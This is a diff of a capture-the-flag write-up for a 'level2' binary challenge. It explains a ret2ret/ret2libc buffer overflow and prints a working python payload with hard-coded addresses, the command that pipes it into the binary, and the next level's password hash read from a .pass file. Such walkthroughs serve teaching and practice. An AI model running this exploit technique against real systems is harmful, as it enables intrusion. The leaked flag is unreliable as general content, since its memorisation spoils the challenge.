@@ -1,11 +1,16 @@
-We set a breakpoint inside p function to analyze it.
-Then, we discover it accept a buffer and check the value of the ret address to exit early if it's doesnt succeed.
-So we craft 80 bytes of noise, then a ret2ret with the return address of p function.
+# We set a breakpoint inside p function to analyze it.
+# Then, we discover it accept a buffer and check the value of the ret address to exit early if it's doesnt succeed.
+# So we craft 80 bytes of noise, then a ret2ret with the return address of p function.
 
-After, the ret to ret we fulfill with a reference to system instruction, exit instruction and shell string to launch it as a ret2ret exploit.
-These 3 values lay on top of the stack, and we'll be pop by the second ret following our will.
+# After, the ret to ret we fulfill with a reference to system instruction, exit instruction and shell string to launch it as a ret2ret exploit.
+# These 3 values lay on top of the stack, and we'll be pop by the second ret following our will.
 
-So our exploit is built by :
-- python -c "print "A"*80 + 
+# So our exploit is built by :
+#  - python -c "print "A"*80 + "\x
 
-TODO
+python -c 'print "A"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "BBBB" + "\x92\x82\x04\x08"' > /tmp/payload_level2
+cat /tmp/payload_level2 - | ./level2
+
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
